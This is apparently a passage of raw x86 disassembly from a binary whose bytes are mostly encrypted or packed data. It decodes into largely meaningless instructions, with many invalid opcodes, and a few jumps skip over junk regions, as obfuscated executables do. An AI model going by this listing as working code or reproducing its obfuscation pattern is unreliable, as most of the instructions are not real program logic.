  410651:	or     eax,0x7b9f2c5a
  410656:	adc    al,0xa4
  410658:	jp     0x4106a3
  41065a:	mov    al,0xb8
  41065c:	cmp    BYTE PTR [ebx],0xa4
  41065f:	repnz xor DWORD PTR fs:[ebx-0x13],edi
  410664:	ret    
  410665:	sar    BYTE PTR [ebx],0xf2
  410668:	sbb    BYTE PTR [ebx+eiz*1+0xf],ah
  41066c:	pop    esp
  41066d:	fdivr  QWORD PTR [ecx]
  41066f:	jno    0x410633
  410671:	adc    bh,BYTE PTR [ebx]
  410673:	jle    0x4106a5
  410675:	retf   
  410676:	iret   
  410677:	cwde   
  410678:	xor    DWORD PTR [esi-0x26],eax
  41067b:	add    esi,edi
  41067d:	mov    esi,DWORD PTR [esi+0x68]
  410680:	sbb    eax,0xcc1c1a3e
  410685:	aam    0x6f
  410687:	inc    eax
  410688:	scas   al,BYTE PTR es:[edi]
  410689:	dec    edi
  41068a:	in     al,0x66
  41068c:	lods   al,BYTE PTR ds:[esi]
  41068d:	fwait
  41068e:	ret    
  41068f:	ret    0xb87e
  410692:	add    al,0x3d
  410694:	mov    ds:0x4605a3f8,eax
  410699:	sub    ch,BYTE PTR [ecx-0x27]
  41069c:	pop    ebx
  41069d:	leave  
  41069e:	fldcw  WORD PTR [ecx-0x13]
  4106a1:	xchg   esi,eax
  4106a2:	pop    es
  4106a3:	mov    dl,0xe5
  4106a5:	shr    bh,cl
  4106a7:	push   0x5051950a
  4106ac:	pop    es
  4106ad:	jno    0x410689
  4106af:	jnp    0x4106f3
  4106b1:	and    DWORD PTR [eax+0x5b92e777],esp
  4106b7:	mov    ecx,0x6542fd94
  4106bc:	jae    0x4106f3
  4106be:	lods   al,BYTE PTR ds:[esi]
  4106bf:	(bad)  
  4106c0:	aam    0x88
  4106c2:	jle    0x41067d
  4106c4:	push   ds
  4106c5:	stos   BYTE PTR es:[edi],al
  4106c6:	ins    BYTE PTR es:[edi],dx
  4106c7:	lahf   
  4106c8:	shl    DWORD PTR [ecx-0x59],0x49
  4106cc:	push   eax
  4106cd:	(bad)  [esi-0x64bee5f]
  4106d3:	pop    ebp
  4106d4:	mov    eax,ds:0xaedab477
  4106d9:	push   es
  4106da:	inc    ebx
  4106db:	pop    ss
  4106dc:	data16 (bad) 
  4106de:	jmp    0x410753
  4106e0:	pop    ss
  4106e1:	or     BYTE PTR [ecx+0x76c53834],bh
  4106e7:	dec    ecx
  4106e8:	xor    DWORD PTR [edi+0x6a],eax
  4106eb:	daa    
  4106ec:	sub    esi,DWORD PTR [ebx+edx*8]
  4106ef:	mov    dx,0xfd0b
  4106f3:	loopne 0x410769
  4106f5:	aad    0xec
  4106f7:	cmp    al,0xe0
  4106f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106fa:	xchg   edx,eax
  4106fb:	inc    ebx
  4106fc:	sub    al,0xbc
  4106fe:	jmp    0x41076a
  410700:	xchg   esi,eax
  410701:	test   al,0xf7
  410703:	cmp    bh,bl
  410705:	xchg   ax,ax
  410707:	push   cs
  410708:	push   edi
  410709:	aad    0xc8
  41070b:	out    dx,eax
  41070c:	call   0xd221:0x304460ee
  410713:	mov    esp,0x27066ca4
  410718:	or     bh,BYTE PTR [ecx+0x71c85e3f]
  41071e:	sahf   
  41071f:	jb     0x41071c
  410721:	inc    ebx
  410722:	jmp    0x6cf4:0x92ae9ac1
  410729:	cmp    BYTE PTR [esi],dl
  41072b:	jns    0x4106d4
  41072d:	push   esi
  41072e:	pop    ss
  41072f:	sbb    al,0xe4
  410731:	jo     0x4107a3
  410733:	jecxz  0x41077e
  410735:	xlat   BYTE PTR ds:[ebx]
  410736:	fld    TBYTE PTR [edx+0x55]
  410739:	mov    bh,0xa7
  41073b:	(bad)  
  41073d:	mov    ss,ebp
  41073f:	and    al,0x4d
  410741:	adc    eax,0x99f5ee6a
  410746:	cmp    BYTE PTR [eax],dl
  410748:	sub    esi,DWORD PTR [ecx+edi*1-0x33e33237]
  41074f:	jecxz  0x410700
  410751:	mov    edx,0x722d9ea
  410756:	and    ebx,DWORD PTR [ebx+0x19]
  410759:	stos   DWORD PTR es:[edi],eax
  41075a:	adc    esi,ebx
  41075c:	int    0xfb
  41075e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41075f:	pop    ebx
  410760:	rcr    BYTE PTR [edx+ebp*2-0x376f146b],cl
  410767:	out    0xc6,al
  410769:	sbb    DWORD PTR [eax+0x61012cf0],0x42
  410770:	mov    cl,0x9a
  410772:	fild   DWORD PTR [esi+eiz*1+0x6d551bbf]
  410779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41077a:	cmovo  eax,DWORD PTR [esi+ecx*8-0x3d]
  41077f:	xchg   ebp,eax
  410780:	sbb    al,0x28
  410782:	mov    ah,0xa2
  410784:	lods   eax,DWORD PTR ds:[esi]
  410785:	mov    ds:0x8758b52,al
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a9:	shl    DWORD PTR [eax],cl
  4107ab:	sub    ecx,DWORD PTR [ebx-0x5c8f8fba]
  4107b1:	jge    0x410823
  4107b3:	jo     0x410807
  4107b5:	inc    ebx
  4107b6:	inc    ebx
  4107b7:	push   ebx
  4107b8:	jmp    0x9aab405a
  4107bd:	push   0xc7fc726c
  4107c2:	add    DWORD PTR [edi],ebp
  4107c4:	or     al,0x3b
  4107c6:	ret    0xaac9
  4107c9:	icebp  
  4107ca:	xor    edi,DWORD PTR [ebp+0x60371c43]
  4107d0:	fwait
  4107d1:	mov    edx,0x190b320f
  4107d6:	mov    ecx,0x1c034fcf
  4107db:	or     al,0xbd
  4107dd:	xchg   esi,eax
  4107de:	pop    eax
  4107df:	loop   0x410773
  4107e1:	sub    DWORD PTR [ebx-0x73],eax
  4107e4:	dec    ebx
  4107e5:	idiv   BYTE PTR [ecx]
  4107e7:	cmp    BYTE PTR ds:0xa583aaf8,cl
  4107ed:	(bad)  
  4107ee:	jle    0x410851
  4107f0:	data16 aad 0x30
  4107f3:	jge    0x41086f
  4107f5:	arpl   WORD PTR [edi-0x3c488b98],di
  4107fb:	sbb    eax,0xb2e2823b
  410800:	jp     0x4107b1
  410802:	xor    BYTE PTR [eax],bl
  410804:	cmp    dl,BYTE PTR ss:[esi+0x4d87ddf9]
  41080b:	imul   esp,DWORD PTR [ecx],0x14
  41080e:	inc    esp
  41080f:	lods   al,BYTE PTR cs:[esi]
  410811:	xor    eax,0x9855262b
  410816:	jne    0x410836
  410818:	ja     0x4107fd
  41081a:	inc    edi
  41081b:	cli    
  41081c:	or     al,0x30
  41081e:	gs jns 0x4107ba
  410821:	fwait
  410822:	jns    0x410808
  410824:	push   ebx
  410825:	or     DWORD PTR [ebx+edx*4],0x9
  410829:	dec    ecx
  41082a:	dec    ebx
  41082b:	outs   dx,DWORD PTR ds:[esi]
  41082c:	add    WORD PTR [edx+0x7506b26a],cx
  410833:	pusha  
  410834:	cmp    edx,edx
  410836:	dec    edi
  410837:	and    eax,0x4c05772a
  41083c:	pop    edi
  41083d:	dec    ebx
  41083e:	test   ecx,ebx
  410840:	mov    eax,0x972cbfb
  410845:	jge    0x410892
  410847:	sbb    dl,BYTE PTR [ebp+0x17]
  41084a:	fs push cs
  41084c:	dec    ecx
  41084d:	daa    
  41084e:	dec    ecx
  41084f:	pop    ebx
  410850:	adc    edi,DWORD PTR [ebx+eiz*1]
  410853:	mov    dl,0xf6
  410855:	loop   0x410829
  410857:	stos   DWORD PTR es:[edi],eax
  410858:	fist   WORD PTR [edi-0x42319961]
  41085e:	adc    eax,0x74ed79ef
  410863:	add    ebp,DWORD PTR [ebx+edi*1+0x14848fc6]
  41086a:	add    BYTE PTR [eax],0x6b
  41086d:	clc    
  41086e:	and    DWORD PTR [edi+eax*8-0x49],ecx
  410872:	add    bl,BYTE PTR [eax+0x31]
  410875:	sbb    DWORD PTR [ebp-0x62],edi
  410878:	sub    eax,0xc1c2cd35
  41087d:	ss jp  0x410850
  410880:	fiadd  WORD PTR [esi-0x34d2d580]
  410886:	mov    esi,0x347800e4
  41088b:	hlt    
  41088c:	pop    ecx
  41088d:	mov    ch,0x51
  41088f:	cmp    ecx,eax
  410891:	scas   eax,DWORD PTR es:[edi]
  410892:	and    dl,bl
  410894:	bound  ecx,QWORD PTR [edx]
  410896:	fwait
  410897:	je     0x4108c8
  410899:	inc    edx
  41089a:	pushf  
  41089b:	scas   ax,WORD PTR es:[edi]
  41089d:	adc    al,0xc7
  41089f:	push   esp
  4108a0:	out    0x10,eax
  4108a2:	out    0x50,eax
  4108a4:	fsubr  DWORD PTR [ecx]
  4108a6:	adc    DWORD PTR [ecx+eiz*1+0x6e],esp
  4108aa:	in     eax,0x5b
  4108ac:	mov    edx,0xcb97e4a3
  4108b1:	mov    ecx,0x11c2bb6c
  4108b6:	out    0xdc,al
  4108b8:	pop    edi
  4108b9:	cmp    DWORD PTR [ebp+0x1c1ab7cf],ecx
  4108bf:	outs   dx,BYTE PTR ds:[esi]
  4108c0:	jecxz  0x41092e
  4108c2:	ins    DWORD PTR es:[edi],dx
  4108c3:	and    eax,0xc368380c
  4108c8:	test   BYTE PTR ds:0xc6207c29,bl
  4108ce:	mov    edx,0x16dd2c98
  4108d3:	cmp    edi,DWORD PTR [ecx]
  4108d5:	ret    
  4108d6:	mov    ecx,ebx
  4108d8:	mov    ebx,0xb21c6b8e
  4108dd:	aad    0xfa
  4108df:	cwde   
  4108e0:	pusha  
  4108e1:	stc    
  4108e2:	mov    dl,bl
  4108e4:	add    esi,ecx
  4108e6:	clc    
  4108e7:	hlt    
  4108e8:	mov    BYTE PTR [ebp+ecx*8+0x64],cl
  4108ec:	mov    dl,0x10
  4108ee:	lds    edx,FWORD PTR [edx]
  4108f0:	or     eax,0x458ca57a
  4108f5:	daa    
  4108f6:	cmp    dl,dl
  4108f8:	sbb    al,0x3d
  4108fa:	push   esp
  4108fb:	mov    al,BYTE PTR [ebx]
  4108fd:	aas    
  4108fe:	cdq    
  4108ff:	xor    BYTE PTR [ecx-0x4ad9f600],0x53
  410906:	push   0xffffff89
  410908:	pop    ds
  410909:	push   ecx
  41090a:	cmp    DWORD PTR [ecx-0x61],edi
  41090d:	das    
  41090e:	ins    BYTE PTR es:[edi],dx
  41090f:	or     ecx,DWORD PTR [esi-0x24358701]
  410915:	push   es
  410916:	pusha  
  410917:	xor    al,BYTE PTR [ebx+0x3286f67c]
  41091d:	repnz inc edi
  41091f:	mov    edx,0x554c9ada
  410924:	lea    esi,[ebx+0x19d67459]
  41092a:	xor    DWORD PTR ds:0x99e9e59f,esi
  410930:	or     cl,dh
  410932:	aas    
  410933:	cmp    DWORD PTR [eax+0x4c6d5106],ebx
  410939:	jns    0x410976
  41093b:	xor    BYTE PTR [esi+0x1d],ch
  41093e:	dec    eax
  41093f:	ins    DWORD PTR es:[edi],dx
  410940:	inc    ecx
  410941:	cwde   
  410942:	ins    DWORD PTR es:[edi],dx
  410943:	dec    ebp
  410944:	mov    dl,0x36
  410946:	jg     0x41092a
  410948:	mul    BYTE PTR [edi-0x42]
  41094b:	ds in  eax,dx
  41094d:	test   BYTE PTR [ebp-0x51],al
  410950:	pop    ds
  410951:	xchg   edx,eax
  410952:	imul   esp,DWORD PTR [esi],0xb692dfc5
  410958:	jb     0x410948
  41095a:	jl     0x41091a
  41095c:	xchg   DWORD PTR [edi],edx
  41095e:	xor    eax,0x944778e
  410963:	mov    cl,0x7d
  410965:	or     ecx,DWORD PTR [esi]
  410967:	lock xchg esp,eax
  410969:	dec    edi
  41096a:	inc    ecx
  41096b:	in     al,dx
  41096c:	or     esi,DWORD PTR [edx+0x32]
  41096f:	xor    cl,0x5f
  410972:	adc    bh,bh
  410974:	iret   
  410975:	call   0xcd046ff6
  41097a:	xor    ah,0xff
  41097d:	cli    
  41097e:	sysenter 
  410980:	cmp    ebx,DWORD PTR [ebx+ebx*2+0x28]
  410984:	pop    ebx
  410985:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410986:	pop    ss
  410987:	shl    ah,1
  410989:	jmp    0xc39d01ac
  41098e:	mov    ebx,ds
  410990:	mov    eax,0x9ed8e564
  410995:	or     bl,dl
  410997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410998:	stc    
  410999:	xor    eax,0xbf3cbbf4
  41099e:	hlt    
  41099f:	xchg   dx,ax
  4109a1:	push   0xffffff96
  4109a3:	retf   0x19a7
  4109a6:	pusha  
  4109a7:	lods   eax,DWORD PTR ds:[esi]
  4109a8:	mov    esi,0x3a277ecb
  4109ad:	xor    BYTE PTR [ebx+0x2e10ba24],dl
  4109b3:	or     ch,BYTE PTR [ebp-0x44d8fbcd]
  4109b9:	repnz rcl edi,1
  4109bc:	mov    dh,0xb8
  4109be:	inc    edx
  4109bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c0:	cwde   
  4109c1:	aas    
  4109c2:	push   0xffffffed
  4109c4:	(bad)  
  4109c5:	fcomi  st,st(2)
  4109c7:	ret    0x169f
  4109ca:	out    dx,al
  4109cb:	dec    ebp
  4109cc:	setae  BYTE PTR [edx-0x67]
  4109d0:	fisttp WORD PTR [esi+0x13ab3230]
  4109d6:	jl     0x41095e
  4109d8:	jp     0x4109d9
  4109da:	outs   dx,BYTE PTR ds:[esi]
  4109db:	push   0xffffffc3
  4109dd:	add    al,0xf0
  4109df:	bound  edi,QWORD PTR [ecx]
  4109e1:	out    0x19,eax
  4109e3:	(bad)  
  4109e4:	lock push esp
  4109e6:	test   DWORD PTR [ebx+ebp*8+0xc1388d8],ecx
  4109ed:	call   0xe50d6b2c
  4109f2:	out    0xeb,al
  4109f4:	stos   BYTE PTR es:[edi],al
  4109f5:	xor    eax,0xc2de1544
  4109fa:	ja     0x4109aa
  4109fc:	and    eax,0x4171fd15
  410a01:	inc    esp
  410a02:	dec    esi
  410a03:	mov    eax,0x600834fd
  410a08:	dec    esi
  410a09:	xchg   esi,eax
  410a0a:	test   al,0xea
  410a0c:	sub    edi,DWORD PTR [eax-0x215a2f82]
  410a12:	dec    edi
  410a13:	ror    BYTE PTR [ebx+ebp*1-0x19f455a6],0x30
  410a1b:	cmp    DWORD PTR ds:0x22ea9880,edx
  410a21:	sbb    bh,BYTE PTR [edx]
  410a23:	inc    edi
  410a24:	and    ah,BYTE PTR [edx-0x29]
  410a27:	jnp    0x4109ab
  410a29:	push   0xc05a56b0
  410a2e:	sbb    dl,ch
  410a30:	imul   ecx
  410a32:	stos   DWORD PTR es:[edi],eax
  410a33:	jg     0x410a96
  410a35:	rcl    DWORD PTR [esi-0x1b5290f4],1
  410a3b:	inc    ch
  410a3d:	xor    al,0xd3
  410a3f:	clc    
  410a40:	lock xchg edx,ebp
  410a43:	lods   eax,DWORD PTR ds:[esi]
  410a44:	inc    ecx
  410a45:	mov    bh,0x90
  410a47:	xchg   esp,eax
  410a48:	out    0x24,eax
  410a4a:	or     DWORD PTR [ebp+0x6e58ccde],0xf53820d5
  410a54:	lods   eax,DWORD PTR ds:[esi]
  410a55:	jno    0x410ace
  410a57:	mov    ebx,ebx
  410a59:	(bad)  
  410a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a5b:	dec    esi
  410a5c:	pop    esp
  410a5d:	jae    0x410a98
  410a5f:	mov    cl,0x7
  410a61:	jge    0x410a14
  410a63:	addr16 icebp 
  410a65:	in     eax,dx
  410a66:	mov    dl,0xc6
  410a68:	dec    edx
  410a69:	enter  0xa491,0xc3
  410a6d:	push   ecx
  410a6e:	xor    cl,al
  410a70:	or     al,0xd5
  410a72:	aaa    
  410a73:	inc    esp
  410a74:	inc    DWORD PTR [eax+0x11150daf]
  410a7a:	push   ss
  410a7b:	xor    DWORD PTR [ecx+esi*8+0x390ca66f],ecx
  410a82:	pop    ss
  410a83:	pop    eax
  410a84:	aam    0x42
  410a86:	(bad)  
  410a87:	and    bl,BYTE PTR [esi+0x5452f8ee]
  410a8d:	inc    ebp
  410a8e:	in     eax,0xc2
  410a90:	imul   ebx,DWORD PTR ds:0x1e83678,0xb2d65d0f
  410a9a:	push   ds
  410a9b:	lahf   
  410a9c:	mov    ah,0x3b
  410a9e:	mov    bl,0xb9
  410aa0:	(bad)  
  410aa1:	mov    ss,WORD PTR [edx-0x59]
  410aa4:	adc    DWORD PTR [esi],ebx
  410aa6:	mov    esi,DWORD PTR [esi]
  410aa8:	mov    cl,0x14
  410aaa:	jbe    0x410a3f
  410aac:	daa    
  410aad:	jno    0x410a85
  410aaf:	xchg   ebx,eax
  410ab0:	xchg   edi,eax
  410ab1:	fmul   QWORD PTR [ebp+0x62bc3a6f]
  410ab7:	sbb    eax,edx
  410ab9:	mov    eax,0x89ed6002
  410abe:	mov    eax,ds:0x95202206
  410ac3:	push   cs
  410ac4:	pop    ebp
  410ac5:	dec    esp
  410ac6:	std    
  410ac7:	cmp    DWORD PTR [ebp+0x7b8fe4ed],eax
  410acd:	add    DWORD PTR [ebp-0x3d],edi
  410ad0:	fdivp  st(6),st
  410ad2:	push   esp
  410ad3:	enter  0xf4d3,0x3d
  410ad7:	sahf   
  410ad8:	push   ebp
  410ad9:	test   al,0xb1
  410adb:	pusha  
  410adc:	mov    ah,0x4d
  410ade:	es push ds
  410ae0:	mov    BYTE PTR [esi+eiz*2+0x71f63dec],0x0
  410ae8:	push   ebp
  410ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aea:	fbld   TBYTE PTR [eax]
  410aec:	push   0xa
  410aee:	mov    dl,0x8f
  410af0:	mov    dl,0xf2
  410af2:	mov    esi,0x90a2ac4c
  410af7:	jne    0x410b32
  410af9:	push   eax
  410afa:	mov    dh,0x54
  410afc:	popa   
  410afd:	loopne 0x410ab6
  410aff:	pop    eax
  410b00:	in     eax,0xb5
  410b02:	pop    esi
  410b03:	adc    DWORD PTR [edi+0x6163af6c],esp
  410b09:	mov    ah,0xe1
  410b0b:	enter  0x33ae,0xd4
  410b0f:	jmp    0xab3946ea
  410b14:	icebp  
  410b15:	scas   eax,DWORD PTR es:[edi]
  410b16:	out    dx,eax
  410b17:	jno    0x410b95
  410b19:	mov    al,ds:0x5bfca8cb
  410b1e:	scas   al,BYTE PTR es:[edi]
  410b1f:	fcomp  st(5)
  410b21:	pop    ebx
  410b22:	push   esp
  410b23:	rcl    BYTE PTR [ebp+0x6],1
  410b26:	fsubr  QWORD PTR [ebx-0x774cd3a0]
  410b2c:	xchg   edx,eax
  410b2d:	jecxz  0x410b14
  410b2f:	out    0x1b,eax
  410b31:	clc    
  410b32:	adc    bl,BYTE PTR [ebx+ecx*4+0x6dc2af7f]
  410b39:	and    DWORD PTR [edi+0x29d8a143],eax
  410b3f:	fnstenv [edi]
  410b41:	cmp    bl,cl
  410b43:	(bad)  [ecx+0x73]
  410b46:	in     al,0x69
  410b48:	in     al,dx
  410b49:	sbb    edi,DWORD PTR [eax]
  410b4b:	jbe    0x410b17
  410b4d:	and    al,ah
  410b4f:	sub    DWORD PTR [edi-0x34d05a7a],ecx
  410b55:	leave  
  410b56:	rcl    edx,cl
  410b58:	add    BYTE PTR [edi+0x72],bh
  410b5b:	mov    al,0xba
  410b5d:	ret    
  410b5e:	jg     0x410b11
  410b60:	mov    al,0x39
  410b62:	inc    esi
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz pushf 
  410ba5:	mov    WORD PTR [ecx+0x70423e8b],cs
  410bab:	jo     0x410c05
  410bad:	jge    0x410c1f
  410baf:	jo     0x410b5d
  410bb1:	cld    
  410bb2:	outs   dx,BYTE PTR ds:[esi]
  410bb3:	ret    
  410bb4:	dec    esp
  410bb5:	lea    ebx,[edx-0x2c]
  410bb8:	loop   0x410bfa
  410bba:	stos   BYTE PTR es:[edi],al
  410bbb:	xchg   esi,eax
  410bbc:	jg     0x410b9c
  410bbe:	pop    ebp
  410bbf:	mov    bh,0x41
  410bc1:	push   ebx
  410bc2:	sbb    eax,0xbbfdc1f3
  410bc7:	call   0xf44c:0x4d78189d
  410bce:	(bad)  
  410bcf:	int3   
  410bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bd1:	in     al,0x94
  410bd3:	popa   
  410bd4:	sar    dh,0x7c
  410bd7:	test   ah,0xb8
  410bda:	adc    ebp,esi
  410bdc:	mov    edi,0x60f600c0
  410be1:	add    BYTE PTR [edi-0x2f221a87],dh
  410be7:	push   esi
  410be8:	mov    ecx,edi
  410bea:	aam    0x8e
  410bec:	mov    ?,WORD PTR ds:0x673cfbf
  410bf2:	sub    BYTE PTR [edx],bl
  410bf4:	sub    ah,BYTE PTR [edx-0x26]
  410bf7:	push   es
  410bf8:	cmp    esp,DWORD PTR [ecx+0x40483ad3]
  410bfe:	retf   
  410bff:	icebp  
  410c00:	xor    ebx,DWORD PTR [edx+esi*2-0x29]
  410c04:	aad    0xca
  410c06:	push   edx
  410c07:	sub    BYTE PTR [edx],dh
  410c09:	or     eax,0x7960e1f1
  410c0e:	xor    eax,0xe5c3abfe
  410c13:	mov    ch,0xc1
  410c15:	add    ecx,edx
  410c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c18:	pop    ebp
  410c19:	imul   edi,DWORD PTR [esi],0x1ed8872
  410c1f:	mov    ebx,0xbc8e9f3c
  410c24:	fbstp  TBYTE PTR [edx+edi*2+0x7]
  410c28:	in     eax,dx
  410c29:	xchg   edx,eax
  410c2a:	fiadd  WORD PTR [esi-0x68ef428c]
  410c30:	scas   al,BYTE PTR es:[edi]
  410c31:	push   esp
  410c32:	fisub  WORD PTR [edx+0xdc9665e]
  410c38:	or     dl,bh
  410c3a:	add    eax,DWORD PTR [esi+0x30616894]
  410c40:	sub    al,0x96
  410c42:	loopne 0x410c8c
  410c44:	xor    bh,bh
  410c46:	push   edi
  410c47:	mov    ebx,0x67392221
  410c4c:	out    0xb8,al
  410c4e:	scas   al,BYTE PTR es:[edi]
  410c4f:	aam    0xbe
  410c51:	into   
  410c52:	adc    bh,cl
  410c54:	pop    edi
  410c55:	xchg   ecx,eax
  410c56:	int3   
  410c57:	inc    edi
  410c58:	pop    ds
  410c59:	add    DWORD PTR [ebp-0x1c],0xa107aaa8
  410c60:	sub    DWORD PTR [ebx+ebp*8],ebx
  410c63:	adc    edx,esp
  410c65:	and    bl,BYTE PTR [ebx]
  410c67:	xchg   edx,eax
  410c68:	mov    esp,edi
  410c6a:	fs mov esp,0x81804774
  410c70:	jbe    0x410c3c
  410c72:	add    DWORD PTR [eax],esp
  410c74:	push   eax
  410c75:	sbb    al,0xdf
  410c77:	xchg   esp,eax
  410c78:	push   cs
  410c79:	repnz sub ah,BYTE PTR [ecx+0x2c]
  410c7d:	sahf   
  410c7e:	xchg   esp,eax
  410c7f:	cmp    BYTE PTR [esi+eiz*2-0x80],bl
  410c83:	sub    al,0xc0
  410c85:	in     al,0x7
  410c87:	enter  0x65c6,0x79
  410c8b:	dec    esi
  410c8c:	fcomip st,st(6)
  410c8e:	jg     0x410cec
  410c90:	cmp    DWORD PTR [edi],0xffffffb5
  410c93:	push   edx
  410c94:	pop    ebp
  410c95:	imul   eax,DWORD PTR [eax+0x51],0xa8a3547f
  410c9c:	and    ecx,DWORD PTR [edx+0x658870f3]
  410ca2:	push   ds
  410ca3:	cli    
  410ca4:	xor    ebp,DWORD PTR [ecx-0x1b927c09]
  410caa:	fisubr DWORD PTR [edi]
  410cac:	xchg   ebp,eax
  410cad:	jmp    0x16cd:0x60dbbe81
  410cb4:	cmp    DWORD PTR [ebx-0x73769cca],ebp
  410cba:	or     dh,BYTE PTR [ecx+0x4e458977]
  410cc0:	(bad)  
  410cc1:	out    dx,al
  410cc2:	vpxor  xmm2,xmm6,XMMWORD PTR [edx]
  410cc7:	(bad)  
  410cc8:	clc    
  410cc9:	pop    eax
  410cca:	dec    esp
  410ccb:	inc    edx
  410ccc:	fiadd  DWORD PTR [esi+esi*1]
  410ccf:	pop    ss
  410cd0:	xlat   BYTE PTR ds:[ebx]
  410cd1:	mov    DWORD PTR [ebx-0x7e6848dc],eax
  410cd7:	sub    BYTE PTR [esi+0x6e4b25e4],ch
  410cdd:	pop    ebx
  410cde:	fnstenv [esi+edx*8+0x1e]
  410ce2:	xchg   BYTE PTR [eax+0x6f],cl
  410ce5:	ret    
  410ce6:	mov    DWORD PTR [esi+edi*1-0x33],eax
  410cea:	jecxz  0x410c7a
  410cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ced:	xchg   esp,eax
  410cee:	sub    esp,ebp
  410cf0:	jmp    0x410d28
  410cf2:	nop
  410cf3:	add    DWORD PTR [ebx+0x73d36b30],esp
  410cf9:	call   DWORD PTR [edx]
  410cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cfc:	jo     0x410d3d
  410cfe:	mov    ecx,0x928d3250
  410d03:	iret   
  410d04:	enter  0xa2c4,0xf5
  410d08:	add    BYTE PTR ds:[eax],0x7c
  410d0c:	xchg   edx,eax
  410d0e:	xchg   BYTE PTR [edx+0x6bebb938],bl
  410d14:	cmp    esp,DWORD PTR ds:[eax+edx*4]
  410d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d19:	add    al,0x71
  410d1b:	pop    edi
  410d1c:	test   BYTE PTR [edi+0xe01006],ch
  410d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d23:	or     eax,0x8b79d910
  410d28:	retf   0xadbc
  410d2b:	fst    DWORD PTR [ebp-0x10]
  410d2e:	fidiv  WORD PTR [esi]
  410d30:	xlat   BYTE PTR ds:[ebx]
  410d31:	stos   DWORD PTR es:[edi],eax
  410d32:	(bad)  
  410d33:	mov    ebp,0x4590027d
  410d38:	xchg   esp,eax
  410d39:	mov    ebx,0x9eb8b0de
  410d3e:	mov    ds:0xd8e06abf,eax
  410d43:	cdq    
  410d44:	idiv   DWORD PTR [edi+0xb5fbe4c]
  410d4a:	jae    0x410d2a
  410d4c:	jns    0x410ce1
  410d4e:	mov    ds:0xf999cef4,al
  410d53:	ret    0x766e
  410d56:	adc    bh,BYTE PTR [esi-0x37]
  410d59:	and    DWORD PTR [ebp-0x6],esp
  410d5c:	out    0x7f,al
  410d5e:	ins    DWORD PTR es:[edi],dx
  410d5f:	add    cl,dl
  410d61:	retf   0x37ec
  410d64:	push   ebx
  410d65:	pusha  
  410d66:	adc    DWORD PTR [esi+0x68423727],ebp
  410d6c:	cmp    ebp,0x7e5d5474
  410d72:	cmp    DWORD PTR [esi],ebx
  410d74:	ret    
  410d75:	je     0x410d55
  410d77:	sub    BYTE PTR [edi+0x675f6e35],dh
  410d7d:	stos   DWORD PTR es:[edi],eax
  410d7e:	add    esi,0xffffffa5
  410d81:	mov    edi,0xabf99742
  410d86:	inc    ebp
  410d87:	dec    esp
  410d88:	cwde   
  410d89:	jns    0x410d3f
  410d8b:	dec    BYTE PTR [edx-0x4e]
  410d8e:	fnstenv [esi]
  410d90:	(bad)  
  410d92:	mov    ecx,0x2ae6dfa2
  410d97:	rol    BYTE PTR ds:0x242fe357,cl
  410d9d:	leave  
  410d9e:	adc    BYTE PTR [edi],dh
  410da0:	ins    BYTE PTR es:[edi],dx
  410da1:	push   eax
  410da2:	cli    
  410da3:	mov    ch,0xc3
  410da5:	enter  0x111d,0x8f
  410da9:	iret   
  410daa:	(bad)  
  410dac:	lock ror DWORD PTR [ecx],0x86
  410db0:	sahf   
  410db1:	adc    eax,0x3e994c1f
  410db6:	addr16 mov al,0x88
  410db9:	cwde   
  410dba:	cwde   
  410dbb:	mov    ebp,fs
  410dbd:	ret    0x1d38
  410dc0:	fldenv [ecx-0x5d58d394]
  410dc6:	mov    eax,ds:0x3fab5b69
  410dcc:	xor    al,0x54
  410dce:	mov    ebp,0x5447712a
  410dd3:	jnp    0x410d8f
  410dd5:	dec    edx
  410dd6:	mov    ch,0x94
  410dd8:	imul   ebx,DWORD PTR [ecx-0x67],0x60a65508
  410ddf:	stos   BYTE PTR es:[edi],al
  410de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410de1:	sub    ch,BYTE PTR [ebx+esi*1-0x5eb5b3bd]
  410de8:	mov    eax,eax
  410dea:	jmp    0xa7ae5b82
  410def:	loope  0x410e67
  410df1:	(bad)  
  410df2:	ror    bl,cl
  410df4:	mov    ecx,0xbed8406e
  410df9:	adc    DWORD PTR [edi+0x1d],edi
  410dfc:	iret   
  410dfd:	mov    eax,0xa42c3b3a
  410e02:	mov    edi,?
  410e04:	fild   QWORD PTR [ebp+0x19]
  410e07:	js     0x410dc0
